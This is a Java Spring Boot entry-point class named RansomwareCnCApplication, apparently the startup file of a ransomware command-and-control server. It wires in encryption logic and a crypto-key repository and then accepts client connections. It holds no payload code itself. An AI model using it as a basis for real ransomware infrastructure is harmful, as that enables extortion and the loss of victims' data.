package server;

import java.io.IOException;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.domain.EntityScan;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;

import server.networking.Server;

@SpringBootApplication
@ComponentScan({ "server.bl.EncryptionLogic" })
@EntityScan("server.entites.CryptoKey")
@EnableJpaRepositories("server.repositories.KeyRepository")
public class RansomwareCnCApplication {

	public static void main(String[] args) {

		 SpringApplication.run(RansomwareCnCApplication.class, args);

		Server s = new Server();
		try {
			s.connectClients();
		} catch (IOException e) {

		}

	}

}
